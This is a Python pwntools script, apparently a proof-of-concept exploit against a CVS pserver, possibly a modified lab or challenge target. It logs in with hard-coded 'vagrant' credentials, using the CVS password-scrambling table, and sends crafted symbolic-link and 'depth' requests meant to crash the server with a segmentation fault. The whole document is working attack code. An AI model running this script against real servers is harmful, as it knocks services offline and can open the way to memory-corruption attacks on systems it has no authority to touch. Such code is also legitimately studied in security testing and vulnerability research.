from pwn import *
import os
import sys
import time

shifts = [   0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  10,  11,  12,  13,  14,  15,
             16,  17,  18,  19,  20,  21,  22,  23,  24,  25,  26,  27,  28,  29,  30,  31,
            114, 120,  53,  79,  96, 109,  72, 108,  70,  64,  76,  67, 116,  74,  68,  87,
            111,  52,  75, 119,  49,  34,  82,  81,  95,  65, 112,  86, 118, 110, 122, 105,
             41,  57,  83,  43,  46, 102,  40,  89,  38, 103,  45,  50,  42, 123,  91,  35,
            125,  55,  54,  66, 124, 126,  59,  47,  92,  71, 115,  78,  88, 107, 106,  56,
             36, 121, 117, 104, 101, 100,  69,  73,  99,  63,  94,  93,  39,  37,  61,  48,
             58, 113,  32,  90,  44,  98,  60,  51,  33,  97,  62,  77,  84,  80,  85, 223,
            225, 216, 187, 166, 229, 189, 222, 188, 141, 249, 148, 200, 184, 136, 248, 190,
            199, 170, 181, 204, 138, 232, 218, 183, 255, 234, 220, 247, 213, 203, 226, 193,
            174, 172, 228, 252, 217, 201, 131, 230, 197, 211, 145, 238, 161, 179, 160, 212,
            207, 221, 254, 173, 202, 146, 224, 151, 140, 196, 205, 130, 135, 133, 143, 246,
            192, 159, 244, 239, 185, 168, 215, 144, 139, 165, 180, 157, 147, 186, 214, 176,
            227, 231, 219, 169, 175, 156, 206, 198, 129, 164, 150, 210, 154, 177, 134, 127,
            182, 128, 158, 208, 162, 132, 167, 209, 149, 241, 153, 251, 237, 236, 171, 195,
            243, 233, 253, 240, 194, 250, 191, 155, 142, 137, 245, 235, 163, 242, 178, 152 ]

def scramble( password ):
    ## The 'A' indicates the type of scrambling. There is only one type
    s = b'A'

    for x in password:
        s += chr(shifts[x]).encode('UTF-8')

    return s

def exploit(HOST, PORT):
    print(f'[INFO] Connecting to {HOST}:{PORT}')

    p = remote(HOST, PORT)

    print(f'[INFO] Connected to {HOST}:{PORT}')

    p.sendline(b'BEGIN AUTH REQUEST')
    p.sendline(b'/srv/cvsroot')
    p.sendline(b'vagrant')
    p.sendline(scramble(b'vagrant'))
    p.sendline(b'END AUTH REQUEST')

    y = p.readline()

    if y != b'I LOVE YOU\n':
        print('[ERROR] Auth failed: %s' %y)
        p.close()
        exit(0)

    print('[INFO] Logged into the cvs server')

    p.sendline(b'Root /srv/cvsroot')
    p.sendline('Valid-responses ok error Valid-requests Force-gzip Referrer Redirect Checked-in New-entry Checksum Copy-file Updated Created Update-existing Merged Patched Rcs-diff Mode Mod-time Removed Remove-entry Set-static-directory Clear-static-directory Set-sticky Clear-sticky Edit-file Template Clear-template Notified Module-expansion Wrapper-rcsOption M Mbinary LOGM E F MT')

    print('[INFO] Creating symbolic link')
    p.sendline(b'Argument cvstesta/yoloz')
    p.sendline(b'Argument cvstesta/yoloz/deadbeef/badlink')
    p.sendline(b'sym')

    y = p.readline()

    print('[INFO] Symbolic link created, sending depth trigger')
    p.sendline(b'depth')
    y = p.readline()
    z = p.readline()

    if y.find(b'signal 11') != -1:
        print('[SUCCESS] SIGSEGV crash')
        
    p.close()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = os.environ['PORT']
        else:
            print('[USAGE] %s <target_host> <target_port>' %(sys.argv[0]))
            sys.exit(1)

    exploit(HOST, PORT)

    exit(0)

